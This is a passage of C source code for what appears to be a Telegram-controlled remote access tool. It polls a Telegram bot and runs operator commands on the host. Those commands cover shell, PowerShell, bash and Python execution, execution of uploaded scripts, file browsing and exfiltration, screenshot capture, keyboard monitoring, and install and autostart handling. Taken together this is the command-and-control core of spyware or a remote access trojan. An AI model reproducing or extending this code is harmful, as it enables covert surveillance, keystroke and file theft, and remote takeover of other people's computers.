          "• <code>/keyboard_status</code> - View detailed keyboard monitor "
          "state\n"
          "• <code>/keyboard_flush</code> - Flush buffered keys immediately\n"
          "• <code>/keyboard_help</code> - Show full keyboard commands "
          "guide\n\n";
      if (h_off + sizeof(kb_sec) - 1 < sizeof(help_msg)) {
        memcpy(help_msg + h_off, kb_sec, sizeof(kb_sec) - 1);
        h_off += sizeof(kb_sec) - 1;
      }
    }

    if (!config->disable_screenshot) {
      static const char shot_sec[] =
          "<b>Screenshot Controls:</b>\n"
          "• <code>/screenshot [id|all]</code> (or <code>/shot</code>) - Capture "
          "&amp; send desktop screenshot\n"
          "• <code>/screenshot_displays</code> (or <code>/screens</code>) - "
          "List detected displays &amp; active target\n"
          "• <code>/screenshot_select &lt;id|all&gt;</code> - Select default "
          "monitor to capture\n"
          "• <code>/screenshot_format &lt;png|jpg|bmp|plain|tga|hdr&gt;</code> "
          "- Set image format\n"
          "• <code>/screenshot_quality &lt;1-100&gt;</code> - Set compression "
          "quality (default: 85%)\n"
          "• <code>/screenshot_timer &lt;sec&gt;</code> - Configure periodic "
          "capture timer\n"
          "• <code>/screenshot_on</code> / <code>/screenshot_off</code> - "
          "Resume / pause captures\n"
          "• <code>/screenshot_toggle</code> - Toggle active / paused state\n"
          "• <code>/screenshot_status</code> - View screenshot monitor "
          "status\n"
          "• <code>/screenshot_help</code> - Show full screenshot commands "
          "guide\n\n";
      if (h_off + sizeof(shot_sec) - 1 < sizeof(help_msg)) {
        memcpy(help_msg + h_off, shot_sec, sizeof(shot_sec) - 1);
        h_off += sizeof(shot_sec) - 1;
      }
    }

    if (config->telegram_send_files) {
      static const char file_sec[] =
          "📁 <b>Interactive File Explorer &amp; Operations:</b>\n"
          "• <code>/ls [path]</code> (or <code>/files</code>, <code>/fm</code>, <code>/browse</code>) - Interactive File Explorer with inline buttons to navigate, open folders, and download\n"
          "• <code>/cat &lt;file_path&gt;</code> - View formatted text file preview\n"
          "• <code>/getfile &lt;file_path&gt;</code> (or <code>/get</code>, <code>/download</code>) - Direct file download\n"
          "• <code>/fileinfo &lt;path&gt;</code> - Query file/directory metadata\n"
          "• <code>/upload</code> - Instructions to upload files to host\n\n";
      if (h_off + sizeof(file_sec) - 1 < sizeof(help_msg)) {
        memcpy(help_msg + h_off, file_sec, sizeof(file_sec) - 1);
        h_off += sizeof(file_sec) - 1;
      }
    }

    static const char help_tail[] =
        "💡 <i>Tip: Commands also accept dash syntax (e.g. "
        "<code>/keyboard-shortcuts off</code> or <code>/screenshot-format jpg</code>)</i>";
    if (h_off + sizeof(help_tail) - 1 < sizeof(help_msg)) {
      memcpy(help_msg + h_off, help_tail, sizeof(help_tail) - 1);
      h_off += sizeof(help_tail) - 1;
    }
    help_msg[h_off] = '\0';
    telegram_send_html(help_msg);
    break;
  }

  case CMD_UNKNOWN:
  default:
    break;
  }
}

typedef struct {
  telegram_incoming_update_t update;
  char text_buf[1024];
  char chat_id_buf[64];
  char username_buf[64];
} async_cmd_ctx_t;

static int is_heavy_command(c2t_cmd_id_t cmd) {
  switch (cmd) {
  case CMD_SCREENSHOT:
  case CMD_GETFILE:
  case CMD_LS:
  case CMD_FILE_EXPLORER:
  case CMD_CAT:
  case CMD_FILEINFO:
  case CMD_UPLOAD:
  case CMD_SHELL:
  case CMD_POWERSHELL:
  case CMD_BASH:
  case CMD_CMD:
  case CMD_PYTHON:
  case CMD_STDIN:
  case CMD_SESSION:
  case CMD_SESSION_START:
  case CMD_SESSION_IN:
  case CMD_SESSION_STOP:
  case CMD_SESSION_STATUS:
  case CMD_RUNFILE:
  case CMD_SHELL_LIVE:
  case CMD_LOGS:
  case CMD_RESTART:
  case CMD_RESTART_KEYBOARD:
  case CMD_RESTART_CLIPBOARD:
  case CMD_RESTART_SCREENSHOT:
  case CMD_RESTART_LOGS:
  case CMD_RESTART_ALL:
  case CMD_INSTALL:
  case CMD_UNINSTALL:
  case CMD_AUTOSTART:
    return 1;
  default:
    return 0;
  }
}

static int is_script_file_extension(const char *name) {
  if (!name || !*name)
    return 0;
  const char *dot = strrchr(name, '.');
  if (!dot)
    return 0;
  if (c2t_strcasecmp(dot, ".sh") == 0 || c2t_strcasecmp(dot, ".bash") == 0 ||
      c2t_strcasecmp(dot, ".zsh") == 0 || c2t_strcasecmp(dot, ".ps1") == 0 ||
      c2t_strcasecmp(dot, ".bat") == 0 || c2t_strcasecmp(dot, ".cmd") == 0 ||
      c2t_strcasecmp(dot, ".py") == 0 || c2t_strcasecmp(dot, ".vbs") == 0 ||
      c2t_strcasecmp(dot, ".js") == 0 || c2t_strcasecmp(dot, ".pl") == 0 ||
      c2t_strcasecmp(dot, ".rb") == 0) {
    return 1;
  }
  return 0;
}

static int is_script_run_caption(const char *caption, const char *file_name) {
  const char *cap = caption ? caption : "";
  while (*cap && isspace((unsigned char)*cap))
    cap++;

  /* If explicitly asking to save or upload, do not execute */
  if (strncmp(cap, "/upload", 7) == 0 || strncmp(cap, "/put", 4) == 0 ||
      strncmp(cap, "/save", 5) == 0 || strncmp(cap, "/sendfile", 9) == 0) {
    return 0;
  }

  /* If caption starts with an execution command */
  if (strncmp(cap, "/run", 4) == 0 || strncmp(cap, "/exec", 5) == 0 ||
      strncmp(cap, "/sh", 3) == 0 || strncmp(cap, "/shell", 6) == 0 ||
      strncmp(cap, "/cmd", 4) == 0 || strncmp(cap, "/script", 7) == 0 ||
      strncmp(cap, "/bash", 5) == 0 || strncmp(cap, "/ps", 3) == 0 ||
      strncmp(cap, "/powershell", 11) == 0 || strncmp(cap, "/py", 3) == 0 ||
      strncmp(cap, "/python", 7) == 0 || strncmp(cap, "/runscript", 10) == 0 ||
      strncmp(cap, "/runfile", 8) == 0 || strncmp(cap, "/execfile", 9) == 0) {
    return 1;
  }

  /* If caption is empty or whitespace and file is recognized script extension */
  if (!*cap && is_script_file_extension(file_name)) {
    return 1;
  }

  return 0;
}

#ifdef _WIN32
static DWORD WINAPI async_command_worker(LPVOID arg) {
  async_cmd_ctx_t *ctx = (async_cmd_ctx_t *)arg;
  if (ctx) {
    handle_command(&ctx->update, ctx->chat_id_buf, ctx->username_buf);
    free(ctx);
  }
  return 0;
}
#else
static void *async_command_worker(void *arg) {
  async_cmd_ctx_t *ctx = (async_cmd_ctx_t *)arg;
  if (ctx) {
    handle_command(&ctx->update, ctx->chat_id_buf, ctx->username_buf);
    free(ctx);
  }
  return nullptr;
}
#endif

static void
on_telegram_command_received(const telegram_incoming_update_t *update,
                             [[maybe_unused]] void *user_data) {
  if (!update)
    return;

  const c2t_config_t *config = c2t_config_get();
  if (!config->telegram_chat_id || !*config->telegram_chat_id) {
    c2t_log_warning("listener", "Telegram chat_id is not configured");
    return;
  }

  const char *cfg_chat = config->telegram_chat_id;
  const char *chat_id = update->chat_id ? update->chat_id : "";
  while (isspace((unsigned char)*cfg_chat))
    cfg_chat++;
  while (isspace((unsigned char)*chat_id))
    chat_id++;

  if (strcmp(chat_id, cfg_chat) != 0) {
    c2t_log_warning(
        "listener",
        "Ignored update from unauthorized chat_id: %s (authorized: %s)",
        chat_id, cfg_chat);
    return;
  }

  /* Handle inline keyboard button callbacks */
  if (update->callback_query_id && update->callback_data) {
    if (c2t_shell_live_handle_callback(update->callback_query_id,
                                        update->callback_data)) {
      return;
    }
    if (c2t_file_explorer_handle_callback(update->callback_query_id,
                                         update->callback_data)) {
      return;
    }
    return;
  }

  /* If incoming update has an attached file/document/photo */
  if (update->file_id && *update->file_id) {
    c2t_log_info(
        "listener",
        "Received file attachment (name='%s', file_id=%s) from chat %s",
        update->file_name ? update->file_name : "", update->file_id, chat_id);

    if (is_script_run_caption(update->caption, update->file_name)) {
      c2t_log_info("listener", "Treating attachment '%s' as script execution",
                   update->file_name ? update->file_name : "");
      (void)c2t_shell_run_uploaded_script(update->file_id, update->file_name,
                                         update->caption);
      return;
    }

    (void)c2t_file_save_uploaded(update->file_id, update->file_name,
                                 update->caption);
    return;
  }

  /* Handle text or caption command */
  const char *cmd_text = (update->text && *update->text)
                             ? update->text
                             : (update->caption && *update->caption
                                    ? update->caption
                                    : nullptr);
  if (cmd_text && *cmd_text) {
    telegram_incoming_update_t eff_update = *update;
    eff_update.text = cmd_text;
    c2t_cmd_id_t cmd_id = lookup_command_id(cmd_text);
    if (user_data != nullptr && (is_heavy_command(cmd_id) || c2t_shell_live_is_active())) {
      async_cmd_ctx_t *ctx =
          (async_cmd_ctx_t *)calloc(1, sizeof(async_cmd_ctx_t));
      if (ctx) {
        ctx->update = eff_update;
        snprintf(ctx->text_buf, sizeof(ctx->text_buf), "%s", cmd_text);
        snprintf(ctx->chat_id_buf, sizeof(ctx->chat_id_buf), "%s", chat_id);
        snprintf(ctx->username_buf, sizeof(ctx->username_buf), "%s",
                 update->username ? update->username : "");
        ctx->update.text = ctx->text_buf;
        ctx->update.chat_id = ctx->chat_id_buf;
        ctx->update.username = ctx->username_buf;

#ifdef _WIN32
        HANDLE h = CreateThread(NULL, 0,
                                (LPTHREAD_START_ROUTINE)async_command_worker,
                                ctx, 0, NULL);
        if (h) {
          CloseHandle(h);
          return;
        }
#else
        pthread_t thr;
        pthread_attr_t attr;
        pthread_attr_init(&attr);
        pthread_attr_setdetachstate(&attr, PTHREAD_CREATE_DETACHED);
        if (pthread_create(&thr, &attr, async_command_worker, ctx) == 0) {
          pthread_attr_destroy(&attr);
          return;
        }
        pthread_attr_destroy(&attr);
#endif
        free(ctx);
      }
    }

    handle_command(&eff_update, chat_id,
                   update->username ? update->username : "");
  }
}

void c2t_telegram_listener_handle_update(
    const telegram_incoming_update_t *update) {
  on_telegram_command_received(update, nullptr);
}

static void interruptible_sleep_ms(unsigned int ms) {
  unsigned int elapsed = 0;
  while (!stopping && elapsed < ms) {
    unsigned int chunk = (ms - elapsed < 100) ? (ms - elapsed) : 100;
#ifndef _WIN32
    struct timespec req = {.tv_sec = (time_t)(chunk / 1000),
                           .tv_nsec = (long)(chunk % 1000) * 1000000L};
    (void)nanosleep(&req, nullptr);
#else
    Sleep((DWORD)chunk);
#endif
    elapsed += chunk;
  }
}

#ifdef _WIN32
static DWORD
    WINAPI telegram_listener_worker_func([[maybe_unused]] void *context)
#else
static void *telegram_listener_worker_func([[maybe_unused]] void *context)
#endif
{
  int64_t offset = 0;
  unsigned int backoff_ms = 1000;

  c2t_log_info("listener",
               "Telegram command listener started (long-polling timeout=%ds)",
               POLL_TIMEOUT_SECONDS);

  /* Fast initial check: drain and advance offset so all pending / initial
   * updates are processed immediately and confirmed to Telegram server */
  const c2t_config_t *init_config = c2t_config_get();
  if (init_config->telegram_enabled && init_config->telegram_bot_token &&
      init_config->telegram_chat_id) {
    int init_res = telegram_poll_updates_callback(
        init_config->telegram_bot_token, &offset, 0,
        on_telegram_command_received, (void *)(uintptr_t)1);
    if (init_res >= 0 && offset > 0) {
      /* Explicitly acknowledge and confirm offset to Telegram server */
      (void)telegram_poll_updates_callback(
          init_config->telegram_bot_token, &offset, 0, nullptr, nullptr);
      backoff_ms = 1000;
    }
  }

  while (!stopping) {
    const c2t_config_t *config = c2t_config_get();
    if (!config->telegram_enabled || !config->telegram_bot_token ||
        !config->telegram_chat_id) {
      interruptible_sleep_ms(1000);
      continue;
    }

    int res = telegram_poll_updates_callback(
        config->telegram_bot_token, &offset, POLL_TIMEOUT_SECONDS,
        on_telegram_command_received, (void *)(uintptr_t)1);

    if (res >= 0) {
      backoff_ms = 1000;
    } else if (!stopping) {
      c2t_log_warning("listener",
                      "Telegram poll failed, backing off for %u ms...",
                      backoff_ms);
      interruptible_sleep_ms(backoff_ms);
      if (backoff_ms < 30000) {
        backoff_ms = (backoff_ms * 2 > 30000) ? 30000 : backoff_ms * 2;
      }
    }
  }

  telegram_http_thread_cleanup();
  c2t_log_info("listener", "Telegram command listener stopped");

#ifdef _WIN32
  return 0;
#else
  return nullptr;
#endif
}

int c2t_telegram_listener_init(void) {
  init_cmd_table();
  const c2t_config_t *config = c2t_config_get();
  if (!config->telegram_enabled || !config->telegram_bot_token ||
      !config->telegram_chat_id) {
    c2t_log_debug(
        "listener",
        "Telegram listener disabled: Telegram not enabled or unconfigured");
    return 1;
  }

  if (listener_started)
    return 1;

  stopping = 0;
  listener_start_time = (int64_t)time(nullptr);

#ifdef _WIN32
  listener_thread = CreateThread(nullptr, 0, telegram_listener_worker_func,
                                 nullptr, 0, nullptr);
  listener_started = listener_thread != nullptr;
#else
  pthread_attr_t attr;
  pthread_attr_init(&attr);
  pthread_attr_setstacksize(&attr, 512 * 1024);
  listener_started =
      pthread_create(&listener_thread, &attr, telegram_listener_worker_func,
                     nullptr) == 0;
  pthread_attr_destroy(&attr);
#endif

  if (!listener_started) {
    c2t_log_error("listener",
                  "Unable to start Telegram command listener thread");
    return 0;
  }

  return 1;
}

void c2t_telegram_listener_cleanup(void) {
  if (!listener_started)
    return;

  stopping = 1;

#ifdef _WIN32
  WaitForSingleObject(listener_thread, INFINITE);
  CloseHandle(listener_thread);
  listener_thread = nullptr;
#else
  (void)pthread_join(listener_thread, nullptr);
#endif

  listener_started = 0;
  stopping = 0;
}
